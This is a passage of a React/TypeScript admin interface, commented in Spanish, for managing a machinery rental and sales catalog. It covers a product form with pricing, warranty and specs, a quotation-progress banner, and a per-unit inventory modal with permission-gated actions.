                          <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2"><path d="M20 7l-8-4-8 4m16 0l-8 4m8-4v10l-8 4m0-10L4 7m8 4v10M4 7v10l8 4" /></svg>
                          <span className="hidden lg:inline">Inventario</span>
                        </button>
                        <button onClick={() => openEdit(e)} title="Editar" className="w-8 h-8 rounded-lg border border-edge text-mute hover:text-ink hover:border-gold/40 transition-colors flex items-center justify-center">
                          <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="1.8"><path strokeLinecap="round" strokeLinejoin="round" d="M11 4H4a2 2 0 00-2 2v14a2 2 0 002 2h14a2 2 0 002-2v-7M18.5 2.5a2.12 2.12 0 013 3L12 15l-4 1 1-4 9.5-9.5z" /></svg>
                        </button>
                        {/* Borrar es del DUEÑO: quitar una máquina del sistema es como se encubre
                            una que falta. El backend lo rechaza igual; esconderlo aquí evita
                            ofrecer un botón que va a fallar. */}
                        {puede('borrar_catalogo') && (
                        <button onClick={() => del(e.id)} title="Eliminar" className="w-8 h-8 rounded-lg border border-red-500/20 text-red-400 hover:bg-red-500/10 transition-colors flex items-center justify-center">
                          <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="1.8"><path strokeLinecap="round" strokeLinejoin="round" d="M3 6h18M8 6V4a1 1 0 011-1h6a1 1 0 011 1v2m2 0v14a2 2 0 01-2 2H7a2 2 0 01-2-2V6" /></svg>
                        </button>
                        )}
                      </div>
                    </td>
                  </tr>
                )
              })}
            </tbody>
          </table>
          {filtrados.length === 0 && (cargando ? <FilasEsqueleto filas={5} columnas={4} /> : (
            <EstadoVacio
              titulo={q ? 'Nada coincide con tu búsqueda' : 'Tu catálogo está vacío'}
              mensaje={q
                ? 'Prueba con el modelo, la marca o parte del código.'
                : 'Los productos son las fichas que ve el cliente en la tienda. De cada una cuelgan después las unidades físicas.'}
              icono={<><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z" /><path d="M3.3 7 12 12l8.7-5M12 22V12" /></>}
              accion={!q && puedeEditar ? <button onClick={openNew} className="btn-acento h-9 px-4 rounded-full text-[13px] font-bold">Crear el primero</button> : undefined}
            />
          ))}
        </div>
        <Paginador {...pagProps} nombre="productos" />
      </Card>

      {/* Panel lateral de formulario (crear/editar): se desliza desde la derecha
          y deja visible la lista detrás — el contexto no se pierde. */}
      {formOpen && (
        <Modal className="fixed inset-0 z-[60] bg-black/40 backdrop-blur-[2px]" onClose={() => setFormOpen(false)} label={editing ? 'Editar producto' : 'Nuevo producto'}>
          <motion.div
            initial={{ x: '100%' }} animate={{ x: 0 }} transition={{ duration: 0.3, ease: [0.23, 1, 0.32, 1] }}
            onClick={(e: React.MouseEvent) => e.stopPropagation()}
            className="fixed inset-y-0 right-0 w-full sm:max-w-[600px] bg-surface border-l border-edge shadow-[-24px_0_60px_rgba(33,29,22,0.22)] flex flex-col"
          >
            <div className="px-6 py-4 border-b border-edge flex items-center justify-between shrink-0">
              <h2 className="font-bold text-ink">{editing ? 'Editar producto' : 'Nuevo producto'}</h2>
              <button onClick={() => setFormOpen(false)} className="text-mute hover:text-ink p-1" aria-label="Cerrar">
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2"><path strokeLinecap="round" d="M6 6l12 12M18 6L6 18" /></svg>
              </button>
            </div>
            <div className="p-6 space-y-4 flex-1 overflow-y-auto">
              <div>
                <label className={label}>Modelo *</label>
                <input aria-label="Modelo" aria-required="true" className={input} value={form.modelo} onChange={e => setForm({ ...form, modelo: e.target.value })} placeholder="Ej. Mezcladora 9ft³" autoFocus />
              </div>
              <div>
                <label className={label}>Descripción</label>
                <textarea aria-label="Descripción" className={`${input} campo-area`} rows={2} value={form.descripcion || ''} onChange={e => setForm({ ...form, descripcion: e.target.value })} placeholder="Características del equipo" />
              </div>
              {/* Al crear: la condición define qué precios aplican (nueva = solo venta) */}
              <div className="rounded-2xl border border-gold/20 bg-gold-soft/50 p-4">
                <p className="text-[11px] font-semibold uppercase tracking-wide text-gold-ink mb-1">Condición</p>
                <p className="text-xs text-mute mb-3"><b>Nueva</b> → se vende. <b>Seminueva</b> → se renta. Define en qué sección del catálogo aparece.</p>
                <div className="grid grid-cols-2 gap-3">
                  <div>
                    <label className={label}>Condición</label>
                    <select aria-label="Condición" className={input} value={cond} onChange={e => setCond(e.target.value as any)}>
                      <option value="seminueva" className="bg-surface">Seminueva (renta)</option>
                      <option value="nueva" className="bg-surface">Nueva (venta)</option>
                    </select>
                  </div>
                  {!editing && cond === 'seminueva' && (
                    <div>
                      <label className={label}>Unidades</label>
                      <input aria-label="Unidades" type="number" min={1} max={100} className={input} value={cantidad} onChange={e => setCantidad(e.target.value)} />
                    </div>
                  )}
                </div>
                {!editing && cond === 'nueva' && (
                  <div className="mt-3">
                    <label className={label}>Disponibilidad</label>
                    <div className="grid grid-cols-2 gap-1.5 p-1 rounded-2xl bg-surface-2/70 border border-edge">
                      {([
                        { k: 'stock', txt: 'En stock', sub: 'Con inventario', icon: <><path d="M12 3l8 4.5v9L12 21l-8-4.5v-9z" /><path d="M4 7.5l8 4.5 8-4.5" /><path d="M12 12v9" /></> },
                        { k: 'pedido', txt: 'Sobre pedido', sub: 'Al proveedor', icon: <><path d="M3.5 7.5h10v8h-10z" /><path d="M13.5 10.5h3.5l3 3v2h-6.5z" /><circle cx="7" cy="17.5" r="1.5" /><circle cx="17.5" cy="17.5" r="1.5" /></> },
                      ] as const).map(o => {
                        const activo = (o.k === 'pedido') === esSobrePedido
                        return (
                          <button key={o.k} type="button" onClick={() => setEsSobrePedido(o.k === 'pedido')}
                            className={`flex items-center gap-2.5 px-3 py-2.5 rounded-xl text-left transition-all active:scale-[0.985] ${activo ? 'bg-gold text-black shadow-[0_3px_10px_rgba(255,198,26,0.28)]' : 'text-mute hover:text-ink hover:bg-surface/60'}`}>
                            <svg className="w-[18px] h-[18px] shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="1.9" strokeLinecap="round" strokeLinejoin="round">{o.icon}</svg>
                            <span className="min-w-0">
                              <span className="block text-[13px] font-bold leading-tight">{o.txt}</span>
                              <span className={`block text-[10.5px] leading-tight ${activo ? 'text-black/60' : 'text-mute'}`}>{o.sub}</span>
                            </span>
                          </button>
                        )
                      })}
                    </div>
                    {esSobrePedido ? (
                      <div className="mt-2.5 flex items-start gap-2.5 rounded-xl border border-gold/25 bg-gold/[0.06] px-3.5 py-3">
                        <svg className="w-4 h-4 text-gold-ink shrink-0 mt-0.5" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="9" /><path d="M12 8v4l2.5 2.5" /></svg>
                        <p className="text-[12px] text-ink/80 leading-snug">Nace <b className="text-ink">sin stock</b>: se ofrece para pedir al proveedor y la unidad se asigna cuando llega. Al dar de alta stock, pasa a venta inmediata.</p>
                      </div>
                    ) : (
                      <div className="mt-2.5">
                        <label className={label}>¿Cuántas unidades entran a stock?</label>
                        <input aria-label="¿Cuántas unidades entran a stock?" type="number" min={1} max={100} className={input} value={cantidad} onChange={e => setCantidad(e.target.value)} />
                      </div>
                    )}
                  </div>
                )}
              </div>

              {/* Renta → precios de renta; venta → solo su precio de venta. El precio
                  de venta de un equipo de RENTA es interno (el público no lo ve). */}
              <div className="grid grid-cols-2 gap-3">
                {cond === 'seminueva' && (<>
                  <div><label className={label}>Precio / día</label><InputDinero etiqueta="Precio / día" valor={String(form.precio_dia ?? '')} onValor={(v: string) => setForm({ ...form, precio_dia: v })} /></div>
                  <div><label className={label}>Precio / semana</label><InputDinero etiqueta="Precio / semana" valor={String(form.precio_semana ?? '')} onValor={(v: string) => setForm({ ...form, precio_semana: v })} /></div>
                  <div><label className={label}>Precio / mes</label><InputDinero etiqueta="Precio / mes" valor={String(form.precio_mes ?? '')} onValor={(v: string) => setForm({ ...form, precio_mes: v })} /></div>
                </>)}
                <div className={cond === 'seminueva' ? '' : 'col-span-2'}>
                  <label className={label}>Precio venta{cond === 'seminueva' ? ' (interno)' : ''}</label>
                  <InputDinero etiqueta="Precio de venta" valor={String(form.precio_venta ?? '')} onValor={(v: string) => setForm({ ...form, precio_venta: v })} />
                </div>
                {/* Los meses son POR MÁQUINA: 3 es lo normal, no una regla fija. */}
                <div className="col-span-2">
                  <label className={label}>Garantía al comprador (meses)</label>
                  <input aria-label="Garantía al comprador (meses)"
                    type="number" min={0} max={120} className={input}
                    value={(form as any).garantia_meses ?? ''}
                    onChange={e => setForm({ ...form, garantia_meses: e.target.value } as any)}
                    placeholder="3"
                  />
                  <p className="text-[11px] text-mute mt-1">
                    Se aplica sola al vender. En <b>0</b> esta máquina se vende sin garantía.
                  </p>
                </div>
                {cond === 'nueva' && (
                  <p className="col-span-2 text-[11px] text-mute -mt-1">Las <b>nuevas</b> solo se venden, por eso no se piden precios de renta.</p>
                )}
                {cond === 'nueva' && (editing || esSobrePedido) && (
                  <div className="col-span-2">
                    <label className={label}>Días de entrega si es sobre pedido</label>
                    <input aria-label="Días de entrega si es sobre pedido" type="number" min={0} max={365} className={input} value={form.dias_entrega_pedido ?? ''} onChange={e => setForm({ ...form, dias_entrega_pedido: e.target.value })} placeholder="Vacío = usar el tiempo general del negocio" />
                    <p className="text-[11px] text-mute mt-1">Cuánto tarda el proveedor en surtir <b>esta</b> máquina cuando va sobre pedido. Vacío o 0 usa el tiempo general.</p>
                  </div>
                )}
              </div>
              <div className="grid grid-cols-1 gap-3">
                <div><label className={label}>Categoría</label>{sel(categorias, form.categoria, o => setForm({ ...form, categoria: o }), 'Selecciona categoría')}</div>
                <div className="grid grid-cols-2 gap-3">
                  <div><label className={label}>Tipo</label>{sel(tipos, form.tipo, o => setForm({ ...form, tipo: o }), 'Tipo')}</div>
                  <div><label className={label}>Marca</label>{sel(marcas, form.marca, o => setForm({ ...form, marca: o }), 'Marca')}</div>
                </div>
              </div>
              <div>
                <label className={label}>Imagen <span className="text-mute font-normal normal-case">(JPG, PNG, WebP)</span></label>
                <input aria-label="Imagen del producto" type="file" accept="image/jpeg,image/png,image/webp,image/gif,image/*" onChange={e => setImageFile(e.target.files?.[0] || null)}
                  className="w-full text-xs text-mute file:mr-3 file:py-2 file:px-4 file:rounded-full file:border-0 file:bg-gold-soft file:text-gold-ink file:text-xs file:font-semibold hover:file:bg-gold/20 file:cursor-pointer" />
                {editing && form.imagen && !imageFile && (
                  <img src={resolveMediaUrl(form.imagen)} alt="" className="mt-3 w-20 h-20 object-cover rounded-lg" />
                )}
              </div>
              {/* La ficha técnica (PDF) es solo para equipos de VENTA. */}
              {cond === 'nueva' && (
              <div>
                <label className={label}>Ficha técnica <span className="text-mute font-normal normal-case">(PDF — la que descarga el cliente)</span></label>
                <input aria-label="Ficha técnica en PDF" type="file" accept="application/pdf,.pdf" onChange={e => setFichaFile(e.target.files?.[0] || null)}
                  className="w-full text-xs text-mute file:mr-3 file:py-2 file:px-4 file:rounded-full file:border-0 file:bg-gold-soft file:text-gold-ink file:text-xs file:font-semibold hover:file:bg-gold/20 file:cursor-pointer" />
                {fichaFile
                  ? <p className="mt-2 text-[11px] text-emerald-600">Nueva ficha: {fichaFile.name}</p>
                  : (editing && form.ficha_tecnica && (
                    <a href={resolveMediaUrl(form.ficha_tecnica)} target="_blank" rel="noopener noreferrer" className="mt-2 inline-flex items-center gap-1.5 text-[11px] text-gold-ink hover:underline">
                      <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2"><path strokeLinecap="round" strokeLinejoin="round" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4" /></svg>
                      Ver ficha actual
                    </a>
                  ))}
              </div>
              )}

              {/* Especificaciones técnicas: se muestran en la página del producto */}
              <div className="rounded-2xl border border-edge p-4">
                <div className="flex items-center justify-between mb-1">
                  <label className={`${label} !mb-0`}>Especificaciones técnicas{cond === 'nueva' && <span className="text-red-400"> *</span>}</label>
                  <span className="text-[11px] text-mute">{cond === 'nueva' ? 'Obligatorias para venta' : 'Se muestran en la ficha del producto'}</span>
                </div>
                {specs.length > 0 && (
                  <div className="space-y-2 mt-3">
                    {specs.map((s, i) => (
                      <div key={i} className="flex gap-2 items-center">
                        <input aria-label="Etiqueta (ej. Frecuencia)" list="spec-sugeridas" className={`${input} flex-1`} value={s.etiqueta} onChange={e => setSpec(i, 'etiqueta', e.target.value)} placeholder="Etiqueta (ej. Frecuencia)" />
                        <input aria-label="Valor (ej. 60 Hz)" className={`${input} flex-1`} value={s.valor} onChange={e => setSpec(i, 'valor', e.target.value)} placeholder="Valor (ej. 60 Hz)" />
                        <button type="button" onClick={() => removeSpec(i)} title="Quitar" className="shrink-0 w-9 h-9 rounded-lg border border-red-500/20 text-red-400 hover:bg-red-500/10 transition-colors flex items-center justify-center">
                          <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2"><path strokeLinecap="round" d="M6 6l12 12M18 6L6 18" /></svg>
                        </button>
                      </div>
                    ))}
                  </div>
                )}
                <datalist id="spec-sugeridas">{SPEC_SUGERIDAS.map(s => <option key={s} value={s} />)}</datalist>
                <div className="mt-3 flex items-center justify-between gap-3">
                  <button type="button" onClick={addSpec} className="inline-flex items-center gap-1.5 text-sm font-semibold text-gold-ink hover:opacity-80">
                    <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2.2"><path strokeLinecap="round" d="M12 5v14M5 12h14" /></svg>
                    Agregar especificación
                  </button>
                  {form.modelo.trim() && (
                    <button type="button" onClick={() => setPreviewFicha(true)} className="inline-flex items-center gap-1.5 text-sm font-semibold text-ink hover:text-gold-ink transition-colors">
                      <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="1.9"><path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7-10-7-10-7Z" /><circle cx="12" cy="12" r="3" /></svg>
                      Vista previa de ficha
                    </button>
                  )}
                </div>
              </div>

              {/* Promo por equipo: porcentaje de descuento (0 = sin promo) */}
              <div className="rounded-2xl border border-edge p-4">
                <div className="flex items-center justify-between gap-4">
                  <div>
                    <label className={`${label} !mb-0`}>Descuento de promoción</label>
                    <p className="text-[11px] text-mute mt-0.5">Porcentaje que se descuenta del precio. Deja 0 si no hay promoción.</p>
                  </div>
                  <div className="flex items-center gap-1.5 shrink-0">
                    <input aria-label="Descuento de promoción" type="number" min={0} max={90} className={`${input} !w-20 text-center`} value={form.promo_pct ?? 0}
                      onChange={e => setForm(f => ({ ...f, promo_pct: Number(e.target.value) }))} />
                    <span className="text-lg font-bold text-mute">%</span>
                  </div>
                </div>
                {Number(form.promo_pct) > 0 && (
                  <p className="text-[12px] text-gold-ink mt-2.5">
                    El cliente verá la etiqueta roja «PROMO −{Math.min(90, Math.max(0, Number(form.promo_pct) || 0))}%», el precio ya
                    rebajado y el precio original tachado. Ej.: $1,000 queda en ${(1000 * (1 - Math.min(90, Math.max(0, Number(form.promo_pct) || 0)) / 100)).toLocaleString('en-US', { minimumFractionDigits: 2 })}.
                  </p>
                )}
              </div>

              {/* Qué incluye: lista que se muestra en la pestaña del detalle público */}
              <div className="rounded-2xl border border-edge p-4">
                <div className="flex items-center justify-between mb-1">
                  <label className={`${label} !mb-0`}>Qué incluye</label>
                  <span className="text-[11px] text-mute">Una línea por punto · "Título: detalle"</span>
                </div>
                <textarea aria-label="Qué incluye" rows={4} className={`${input} campo-area mt-2`} value={(form.que_incluye || []).join('\n')}
                  onChange={e => setForm(f => ({ ...f, que_incluye: e.target.value.split('\n') }))}
                  placeholder={'Punta y cincel plano: encastre hex 1-1/8\"\nMaletín metálico: con espacio para accesorios'} />
              </div>

            </div>
            <div className="px-6 py-4 border-t border-edge flex justify-end gap-3 shrink-0 bg-surface">
              <button onClick={() => setFormOpen(false)} className="px-6 py-2.5 rounded-full border border-edge text-ink text-sm font-semibold hover:bg-surface-2 transition-colors">Cancelar</button>
              <button onClick={save} disabled={saving} className="px-7 py-2.5 rounded-full bg-gold text-black font-bold text-sm hover:opacity-90 transition-opacity disabled:opacity-50 flex items-center justify-center gap-2">
                {saving ? <span className="w-4 h-4 border-2 border-black/30 border-t-black rounded-full animate-spin" /> : null}
                {editing ? 'Guardar' : 'Crear producto'}
              </button>
            </div>
          </motion.div>
        </Modal>
      )}

      {invEquipo && <InventoryModal equipo={invEquipo} onClose={() => setInvEquipo(null)} notify={notify} />}
      {previewFicha && (
        <FichaTecnicaModal
          equipo={{ modelo: form.modelo, descripcion: form.descripcion, imagen: form.imagen, especificaciones: specs, categoria: form.categoria, tipo: form.tipo, marca: form.marca, condicion: cond, que_incluye: form.que_incluye }}
          onClose={() => setPreviewFicha(false)}
        />
      )}
    </div>
  )
}

/* El letrero de "estoy concretando una cotización". Sirve a renta y a venta:
   cambia el verbo y el color, porque el resto del panel ya usa el azul de renta
   y el dorado de venta y aquí conviene que el color diga a qué viniste. */
function BannerConcretando({ inset = true }: { inset?: boolean }) {
  /* Suscrito, no leído al montar: el puente avanza solo al cerrar cada renta y
     el letrero tiene que decir la máquina que toca AHORA. */
  const p = useSyncExternalStore(suscribirCot, leerCotEnCurso, leerCotEnCurso)
  if (!p) return null
  const avance = progresoCot(p)
  // Sin unidades libres de ESTE equipo: se dice antes de que el admin se ponga
  // a buscar en una lista donde no va a encontrar nada.
  const agotado = p.libres === 0
  const quedan = (p.cola?.length ?? 0) - ((p.paso ?? 0) + 1)
  const venta = p.proposito === 'venta'
  const verbo = venta ? 'Vender' : 'Rentar'
  const tono = venta
    ? 'border-gold/40 bg-gold/10 text-gold-ink'
    : 'border-[color:var(--c-renta)]/40 bg-[color:var(--c-renta)]/10 text-[color:var(--c-renta)]'
  const periodo = p.modalidad
    ? ` (${({ dia: 'por día', semana: 'por semana', mes: 'por mes' } as Record<string, string>)[p.modalidad]}${p.duracion ? ` × ${p.duracion}` : ''})`
    : ''
  return (
    <div className={`${inset ? 'mx-6 mt-3' : ''} flex items-center justify-between gap-3 px-3.5 py-2.5 rounded-xl border ${tono} text-[12.5px] font-bold`}>
      <span>
        {/* Con varias máquinas, el contador va PRIMERO: es lo que dice cuánto
            falta de la cotización, y sin él la segunda vuelta se ve idéntica a
            la primera y uno no sabe si ya terminó. */}
        {avance && <span className="opacity-80">[{avance.actual}/{avance.total}] </span>}
        Concretando {p.folio || 'cotización'} · {p.cliente || 'cliente'}
        {p.equipo_nombre
          ? <> — {avance ? 'ahora toca' : 'el cliente pidió'} <b>{p.equipo_nombre}</b>{venta ? '' : periodo}.{' '}
              {agotado
                ? <span className="text-taller-ink">No hay unidades libres{quedan > 0 ? ' — puedes saltarla y seguir con las demás.' : '. El cliente ya recibió el aviso y se le notificará al liberarse.'}</span>
                : <>Elige la unidad y tócale {verbo}.</>}
            </>
          : ` — elige la unidad y tócale ${verbo}`}
      </span>
      <div className="flex items-center gap-2 shrink-0">
        {/* Saltar: la máquina que no hay no puede parar a las que sí. Sin esto,
            un demoledor todo rentado dejaba el recorrido muerto ahí mismo. */}
        {agotado && quedan > 0 && (
          <button onClick={() => fijarCotEnCurso(siguientePaso(p))}
            className="h-7 px-2.5 rounded-full border border-current/30 text-[11.5px] font-bold hover:bg-current/10 transition-colors whitespace-nowrap">
            Saltar esta
          </button>
        )}
        {/* La ✕ suelta la cotización ENTERA, no solo el paso: si el cliente ya no
            se lleva nada, insistir con las que faltan es peor que soltarlas. */}
        <button onClick={() => fijarCotEnCurso(null)} aria-label="Dejar la cotización para después" title="Dejar para después" className="hover:opacity-70">✕</button>
      </div>
    </div>
  )
}

function InventoryModal({ equipo, onClose, notify }: {
  equipo: Equipo; onClose: () => void; notify: Notify
}) {
  const puede = usePuede()
  const [unidades, setUnidades] = useState<Unidad[]>([])
  const [loading, setLoading] = useState(true)
  const [adding, setAdding] = useState(false)
  const [newCond, setNewCond] = useState<'nueva' | 'seminueva'>('seminueva')
  const [newSerie, setNewSerie] = useState('')
  const [qrUnit, setQrUnit] = useState<Unidad | null>(null)
  const [rentUnit, setRentUnit] = useState<Unidad | null>(null)
  const [sellUnit, setSellUnit] = useState<Unidad | null>(null)
  const [filtro, setFiltro] = useState<'todas' | 'disponibles' | 'fuera'>('todas')
  const [menu, setMenu] = useState<{ id: number; top: number; right: number } | null>(null)
  const [proximoCodigo, setProximoCodigo] = useState('')
  const [confirmando, setConfirmando] = useState(false)
  const { devolver: devolverRenta, modalCobro } = useDevolverRenta(notify)

  const load = useCallback(() => {
    setLoading(true)
    api.get<Unidad[]>(`/equipos/${equipo.id}/unidades/`)
      .then(r => setUnidades(r.data || []))
      .catch(() => setUnidades([]))
      .finally(() => setLoading(false))
  }, [equipo.id])
  useEffect(() => { load() }, [load])

  const puedeAlta = usePuede()('alta_inventario')

  // Predice el código que se asignará, para mostrarlo en la confirmación de alta.
  const cargarProximo = useCallback(() => {
    api.get<{ codigo: string }>(`/equipos/${equipo.id}/unidades/proximo-codigo/`)
      .then(r => setProximoCodigo(r.data?.codigo || ''))
      .catch(() => setProximoCodigo(''))
  }, [equipo.id])
  useEffect(() => { if (puedeAlta) cargarProximo() }, [puedeAlta, cargarProximo])

  function addUnit() {
    setAdding(true)
    api.post(`/equipos/${equipo.id}/unidades/`, { condicion: newCond, numero_serie: newSerie.trim() || null })
      .then(() => { notify('Unidad agregada'); setNewSerie(''); setConfirmando(false); load(); cargarProximo() })
      .catch(err => notify(err?.response?.data?.detail || 'Error al agregar', 'err'))
      .finally(() => setAdding(false))
  }

  async function delUnit(u: Unidad) {
    if (!await confirmar({ titulo: `¿Eliminar la unidad ${u.codigo}?`, mensaje: 'Se borra del inventario. No se puede deshacer.', aceptar: 'Eliminar', tono: 'peligro' })) return
    api.delete(`/unidades/${u.id}/`)
      .then(() => { notify('Unidad eliminada', 'neutro'); load() })
      .catch(err => notify(err?.response?.data?.detail || err?.response?.data?.[0] || 'No se puede eliminar', 'err'))
  }

  function devolver(u: Unidad) {
    if (!u.renta_activa) return
    devolverRenta(u.renta_activa.id, load)
  }

  const counts = {
    disponible: unidades.filter(u => u.estado === 'disponible').length,
    rentado: unidades.filter(u => u.estado === 'rentado').length,
    vendido: unidades.filter(u => u.estado === 'vendido').length,
  }
  const filtradas = unidades.filter(u =>
    filtro === 'disponibles' ? u.estado === 'disponible'
      : filtro === 'fuera' ? u.estado !== 'disponible'
        : true
  )

  return (
    <Modal className="modal-in fixed inset-0 z-[60] bg-black/60 backdrop-blur-sm flex items-end sm:items-start justify-center p-0 sm:p-6" onClose={onClose} label={`Unidades de ${equipo.modelo}`}>
      <div onClick={e => e.stopPropagation()} className="bg-surface w-full sm:max-w-5xl sm:rounded-3xl rounded-t-3xl border border-edge sm:my-auto max-h-[92vh] flex flex-col overflow-hidden shadow-[0_20px_50px_rgba(33,29,22,0.18)]">
        {/* Header */}
        <div className="px-6 sm:px-7 py-5 flex items-start justify-between gap-4">
          <div className="flex items-center gap-3.5 min-w-0">
            <div className="w-12 h-12 rounded-xl bg-surface-2 overflow-hidden shrink-0 grid place-items-center">
              {equipo.imagen
                ? <img src={resolveMediaUrl(equipo.imagen)} alt="" className="w-full h-full object-cover" />
                : <svg className="w-5 h-5 text-mute/40" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="1.6"><path strokeLinecap="round" strokeLinejoin="round" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14M4 6h16v12H4z" /></svg>}
            </div>
            <div className="min-w-0">
              <h2 className="text-[19px] sm:text-[20px] font-black text-ink truncate leading-tight">{equipo.modelo}</h2>
              <p className="text-[13px] text-mute mt-0.5 truncate">
                Inventario por unidad{equipo.categoria?.nombre ? ` · categoría ${equipo.categoria.nombre}` : ''}
              </p>
            </div>
          </div>
          <button onClick={onClose} className="w-9 h-9 rounded-xl bg-surface-2 grid place-items-center text-mute hover:text-ink transition-colors shrink-0" aria-label="Cerrar">
            <svg className="w-[18px] h-[18px]" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2"><path strokeLinecap="round" d="M6 6l12 12M18 6L6 18" /></svg>
          </button>
        </div>

        {/* Zona desplazable: al subir, los KPIs y "Agregar unidad" salen y se ven más unidades */}
        <div className="flex-1 overflow-y-auto min-h-0">
        {/* KPIs por unidad */}
        {/* `gap-px` sobre el color del borde: las divisiones se ven igual de
            limpias con 2 columnas (celular) que con 4 (escritorio). */}
        <div className="grid grid-cols-2 sm:grid-cols-4 gap-px bg-edge border-y border-edge">
          {([
            ['Unidades totales', unidades.length, 'text-ink'],
            ['Disponibles', counts.disponible, 'text-emerald-500'],
            ['Rentadas', counts.rentado, 'text-blue-500'],
            ['Vendidas', counts.vendido, 'text-mute'],
          ] as const).map(([lbl, n, cls]) => (
            <div key={lbl} className="bg-surface px-4 sm:px-6 py-4">
              <p className={`text-[24px] sm:text-[26px] font-black leading-none ${cls}`}>{n}</p>
              <p className="text-[11px] sm:text-[12px] text-mute mt-1.5 leading-tight">{lbl}</p>
            </div>
          ))}
        </div>

        {/* Agregar unidad: aumenta el patrimonio, solo administración */}
        {puedeAlta && <div className="px-6 sm:px-7 py-5 border-b border-edge">
          <div className="flex items-start justify-between gap-3 mb-3">
            <p className="font-bold text-ink">Agregar unidad</p>
            <p className="text-[12px] text-mute text-right leading-tight max-w-[46%]">
              {newCond === 'seminueva' ? 'Una unidad seminueva se renta y se vende.' : 'Una unidad nueva solo se vende.'}
            </p>
          </div>
          <div className="flex flex-col sm:flex-row gap-2.5">
            <div className="flex p-1 rounded-xl border border-edge bg-surface-2 shrink-0">
              {(['nueva', 'seminueva'] as const).map(c => (
                <button key={c} onClick={() => setNewCond(c)}
                  className={`px-4 py-2 rounded-lg text-[13px] font-bold transition-colors ${newCond === c ? 'bg-surface text-ink shadow-sm' : 'text-mute hover:text-ink'}`}>
                  {c === 'nueva' ? 'Nueva' : 'Seminueva'}
                </button>
              ))}
            </div>
            <input aria-label="N° de serie (opcional)" className={`${input} flex-1`} value={newSerie} onChange={e => setNewSerie(e.target.value)} placeholder="N° de serie (opcional)" />
            <button onClick={() => { cargarProximo(); setConfirmando(true) }} className="shrink-0 px-5 py-2.5 rounded-xl border border-edge bg-surface-2 text-ink font-bold text-sm hover:border-gold/40 hover:text-gold-ink transition-colors whitespace-nowrap">
              Agregar
            </button>
          </div>
          {newCond === 'nueva' && !num(equipo.precio_venta) && (
            <p className="mt-2.5 text-[12px] text-taller-ink bg-amber-500/[0.08] border border-amber-500/25 rounded-lg px-3 py-2">
              Este producto no tiene <b>precio de venta</b>: la unidad nueva no saldrá en el catálogo de venta hasta que le pongas uno (edita el producto → <b>Precio venta</b>).
            </p>
          )}
          {confirmando && (
            <div className="mt-3 flex flex-col sm:flex-row sm:items-center justify-between gap-3 rounded-2xl border border-edge px-4 py-3.5">
              <p className="text-[13px] text-ink leading-snug">
                Se dará de alta una unidad <b>{newCond === 'nueva' ? 'nueva' : 'seminueva'}</b>
                {proximoCodigo && <> como <span className="font-mono font-bold text-gold-ink">{proximoCodigo}</span></>}
                {newSerie.trim() ? <>, con serie <b>{newSerie.trim()}</b>.</> : ', sin número de serie.'}
              </p>
              <div className="flex items-center gap-2 shrink-0 self-end sm:self-auto">
                <button onClick={() => setConfirmando(false)} disabled={adding} className="px-4 py-2 rounded-lg text-[13px] font-semibold text-mute hover:text-ink transition-colors disabled:opacity-50">Cancelar</button>
                <button onClick={addUnit} disabled={adding} className="px-5 py-2 rounded-lg bg-gold text-black text-[13px] font-bold hover:opacity-90 transition-opacity disabled:opacity-50 whitespace-nowrap">
                  {adding ? 'Dando de alta…' : 'Sí, dar de alta'}
                </button>
              </div>
            </div>
          )}
        </div>}
        <BannerConcretando />

        {/* Encabezado + filtro de unidades (se queda pegado arriba al desplazar) */}
        <div className="sticky top-0 z-[1] bg-surface px-6 sm:px-7 pt-5 pb-3 flex items-center justify-between gap-3">
          <p className="font-bold text-ink">Unidades <span className="text-mute font-normal">({unidades.length})</span></p>
          <div className="flex p-1 rounded-xl border border-edge bg-surface-2">
            {(['todas', 'disponibles', 'fuera'] as const).map(f => (
              <button key={f} onClick={() => setFiltro(f)}
                className={`px-3 sm:px-3.5 py-1.5 rounded-lg text-[12px] sm:text-[12.5px] font-semibold transition-colors ${filtro === f ? 'bg-surface text-ink shadow-sm' : 'text-mute hover:text-ink'}`}>
                {f === 'todas' ? 'Todas' : f === 'disponibles' ? 'Disponibles' : 'Fuera'}
              </button>
            ))}
          </div>
        </div>

        {/* Lista de unidades */}
        <div className="px-6 sm:px-7 pb-5 space-y-2.5">
          {loading && <p className="text-sm text-mute text-center py-8">Cargando…</p>}
          {!loading && filtradas.length === 0 && (
            <p className="text-sm text-mute text-center py-10">
              {unidades.length === 0
                ? (puedeAlta ? 'Sin unidades. Agrega la primera arriba.' : 'Este producto no tiene unidades registradas.')
                : 'Sin unidades en este filtro.'}
            </p>
          )}
          {filtradas.map(u => (
            <div key={u.id} className="border border-edge rounded-2xl px-4 py-3.5">
              <div className="flex items-center justify-between gap-3 flex-wrap">
                <div className="min-w-0">
                  <div className="flex items-center gap-2 flex-wrap">
                    <span className="font-mono font-bold text-ink text-[15px]">{u.codigo}</span>
                    {pillEstado(u.estado)}
                    {pillCond(u.condicion)}
                  </div>
                  <p className="text-[12.5px] text-mute mt-1">
